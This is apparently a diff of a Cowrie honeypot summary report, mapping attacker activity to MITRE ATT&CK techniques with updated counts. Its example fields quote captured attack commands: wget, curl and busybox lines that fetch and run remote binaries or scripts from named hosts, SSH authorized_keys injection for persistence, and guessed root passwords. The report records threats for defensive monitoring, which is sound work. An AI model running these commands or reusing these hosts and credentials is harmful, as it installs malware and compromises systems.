@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-31 22:02:45",
+  "generated": "2026-08-31 23:00:12",
   "totals": {
-    "commands": 3114,
-    "login_failed": 3105,
-    "login_success": 831,
-    "sessions": 3698
+    "commands": 3210,
+    "login_failed": 3278,
+    "login_success": 853,
+    "sessions": 3889
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3105,
+      "count": 3278,
       "examples": [
         "root / root2025@",
         "root / 7ujMko0vizxv",
@@ -21,14 +21,14 @@
         "support / support"
       ],
       "first": "2026-08-31T00:00:13.861123Z",
-      "last": "2026-08-31T22:02:45.654835Z",
-      "unique_ips": 200
+      "last": "2026-08-31T23:00:07.126072Z",
+      "unique_ips": 210
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 831,
+      "count": 853,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / root",
@@ -37,14 +37,14 @@
         "root / LeitboGi0ro"
       ],
       "first": "2026-08-31T00:01:56.916034Z",
-      "last": "2026-08-31T22:01:34.913965Z",
-      "unique_ips": 115
+      "last": "2026-08-31T23:00:11.358347Z",
+      "unique_ips": 122
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 103,
+      "count": 119,
       "examples": [
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.136/satan_mips; chmod 777 satan_mips; ./sa"
       ],
       "first": "2026-08-31T01:14:33.449575Z",
-      "last": "2026-08-31T21:32:01.212639Z",
-      "unique_ips": 13
+      "last": "2026-08-31T22:23:58.989340Z",
+      "unique_ips": 14
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 94,
+      "count": 105,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -69,8 +69,8 @@
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi"
       ],
       "first": "2026-08-31T01:14:34.428694Z",
-      "last": "2026-08-31T21:31:34.209257Z",
-      "unique_ips": 10
+      "last": "2026-08-31T22:24:08.792945Z",
+      "unique_ips": 11
     },
     {
       "id": "T1082",
@@ -92,14 +92,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 5,
+      "count": 6,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-31T03:14:02.952679Z",
-      "last": "2026-08-31T21:32:01.212639Z",
-      "unique_ips": 5
+      "last": "2026-08-31T22:08:10.798783Z",
+      "unique_ips": 6
     },
     {
       "id": "T1059.004",
@@ -178,23 +178,27 @@
   "unmapped": [
     [
       "sh",
-      717
+      732
     ],
     [
       "shell",
-      707
+      722
     ],
     [
       "system",
-      706
+      721
     ],
     [
       "/bin/busybox UNSTABLE",
-      693
+      707
+    ],
+    [
+      "/bin/busybox",
+      15
     ],
     [
       "enable",
-      11
+      12
     ],
     [
       "/bin/sh",
@@ -206,27 +210,23 @@
     ],
     [
       "linuxshell",
-      8
+      9
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      9
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       8
     ],
     [
-      "cd /proc && cat self/cmdline",
-      8
-    ],
-    [
-      "/bin/busybox",
-      8
-    ],
-    [
       "enablelinuxshell",
-      6
+      7
     ],
     [
       "ping ;sh",
-      6
+      7
     ],
     [
       "RPMA",
